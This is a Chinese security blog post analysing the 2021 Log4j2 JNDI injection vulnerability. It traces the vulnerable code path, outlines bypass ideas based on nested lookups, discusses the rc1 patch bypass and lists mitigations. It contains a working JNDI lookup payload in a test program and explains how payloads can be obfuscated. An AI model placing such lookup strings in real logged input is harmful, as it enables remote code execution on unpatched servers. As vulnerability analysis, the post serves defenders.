---
title: log4j2 JNDI注入漏洞速通~
date: 2021-12-10 17:43:36
tags:
- log4j2
- jndi
- java
---

---

2021年12月9日，一场堪比永恒之蓝的灾难席卷了Java，Log4j2爆出了利用难度极低的JNDI注入漏洞，其漏洞利用难度之低令人叹为观止，基本可以比肩S2。

而和S2不一样的是，由于Log4j2 作为日志记录基础第三方库，被大量Java框架及应用使用，只要用到 Log4j2 进行日志输出且日志内容能被攻击者部分可控，即可能会受到漏洞攻击影响。因此，该漏洞也同时影响全球大量通用应用及组件，例如 ：
Apache Struts2
Apache Solr
Apache Druid
Apache Flink
Apache Flume
Apache Dubbo
Apache Kafka
Spring-boot-starter-log4j2
ElasticSearch
Jedis
Logstash
…

下面我们来一起看看漏洞原理
<!--more-->

# 漏洞分析

## 搭建环境

这里选用log4j-core 2.14.1版本，简单构造一个环境

```
package top.bigking.log4j2attack.service;


import lombok.extern.slf4j.Slf4j;

@Slf4j
public class HelloService {
    public static void main(String[] args) {
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        log.error("${jndi:rmi://127.0.0.1:1099/ruwsfb}");
    }
}

```

spring-boot 需要把原来的log关掉，加入log4j(这是一个普遍用法)

```
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter</artifactId>
    <exclusions><!-- 去掉springboot默认配置 -->
        <exclusion>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-logging</artifactId>
        </exclusion>
    </exclusions>
</dependency>

<dependency> <!-- 引入log4j2依赖 -->
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-log4j2</artifactId>
</dependency>
```

执行即可触发
![](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/20211210173223.png)

# 代码分析

## 漏洞成因

这里我们正常跟error下去
![](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/20211210173341.png)

首先可以看到这里经过了`isEnabled`的验证，这也是很多朋友info函数无法触发的原因，如果不满足配置，则log不会被记录。

这里一路跟到`MessagePatternConverter`的`format`函数
![](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/20211210173351.png)

可以看到这次漏洞的入口，如果代码中存在`${`则会进入额外处理。继续跟下去到`StrSubstitutor`的`substitute`函数
![](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/20211210173359.png)

这里就是漏洞发生的主要部分了，基本上是递归处理里面的语法内容，还有一些内置的语法

`prefixMatcher`是${
`suffixMatcher`是}

只有搜索到这两部分才会进入语法处理
![](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/20211210173409.png)

括号中间的内容被传到varname

并进行两个内置的语法，其中

```
public static final String DEFAULT_VALUE_DELIMITER_STRING = ":-";
public static final StrMatcher DEFAULT_VALUE_DELIMITER = StrMatcher.stringMatcher(":-");
public static final String ESCAPE_DELIMITER_STRING = ":\\-";
public static final StrMatcher DEFAULT_VALUE_ESCAPE_DELIMITER = StrMatcher.stringMatcher(":\\-");
```

![](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/20211210173420.png)

如果匹配到这两个语法，则varname会被修改为对应语法的对应部分（重要绕过）

经过处理的变量，会在418行进入`resolveVariable`函数
![](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/20211210173431.png)

而`resolveVariable`这里则直接根据不同的协议进入相应的lookup，其中`jndi.lookup`就会导致漏洞
![](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/20211210173439.png)

如果执行lookup有返回，则会进入427行的递归处理下一层
![](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/20211210173446.png)

而lookup支持的协议也有很多种
![](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/20211210173452.png)

包括`{date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j}`

如果能顺利的从这个流程走下来，就不难发现整个流程的逻辑问题其实有很多。

## 一些简单的绕过

前面我们是按照payload为`${jndi:rmi://127.0.0.1:1099/ruwsfb}`做分析和处理的。

但在代码中，有很多部分都阐述了这里是存在递归处理的，也就是说我们可以如果嵌套`${}`语法的方式来处理这里的返回。

比如说我们选取lower协议做返回，拼接进入代码中
![](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/20211210173459.png)

同样可以执行

包括他内置的特殊语法
![](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/20211210173505.png)

前半部分会被当做varname，后半部分会被返回替换原本的结果进入下一次拼接，如此一来又可以构造新的payload。

甚至官方在其中还加了容错代码，如果遇到不满足条件的字符，还会被直接删除。
![](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/20211210173511.png)

由于一些特殊的规定，这里我就不公布相关的绕过payload，如果看得懂这部分代码的朋友一定可以很轻松的构造。

# 2.15.0 rc1 的修复

其实这个漏洞几天前就被发布了更新补丁，之前也关注到了，只是没想到利用的逻辑如此简单。

在整个漏洞掀起全安全圈的风暴时，越来越多的朋友将目光集中到这里。rc1的修复也迎来了绕过，这里的绕过其实还挺有意思的，我们一起来看看补丁。

修复补丁和测试样例又很有意思
![](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/20211210173517.png)

简单来说，原本的修复逻辑处理处，想办法使他处理报错，那么原来的catch不会做处理，而是直接走进lookup
![](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/20211210173524.png)

:>

# 修复方案

1、目前Apache官方只发布了2.15.0 rc2并打包了2.15.0的release，没法保证不会被二次绕过，而且据说这个版本兼容度不是很高。
https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2

2、现在普遍的修复方案主要集中在配置修改上
在项目的 log4j2.component.properties 配置文件中添加配置：

```
log4j2.formatMsgNoLookups = true
```

要注意的是，这个配置只生效于2.10.0以上。

也可以在java的启动项中添加该配置

```
-Dlog4j2.formatMsgNoLookups=true
```

3、除此之外可能就要依赖各大WAF了

 

# 写在最后

其实这个漏洞在12月6号就更新补丁了，而且在推特传的很广，最开始看到第一反应是不可能有这么严重的问题，肯定是限制重重。结果利用根本就很简单，一下子席卷了整个java届的所有项目。

而作为一个基础组件，这个组件被大多数的java框架/java应用引用，大量的问题一下子被曝光出来。就在下班短短1个小时，payload就已经流传开了，要不是jndi到rce的利用不算简单，估计很多服务一晚上已经沦陷了。

由于厂商还没来得及发布修复后的release，导致这个漏洞初期只能通过waf防御，如果安全运营构建比较差的厂商，估计只能等死，这种感触不经历这样的大洞可能很难感受到吧。（360什么时候涨啊？

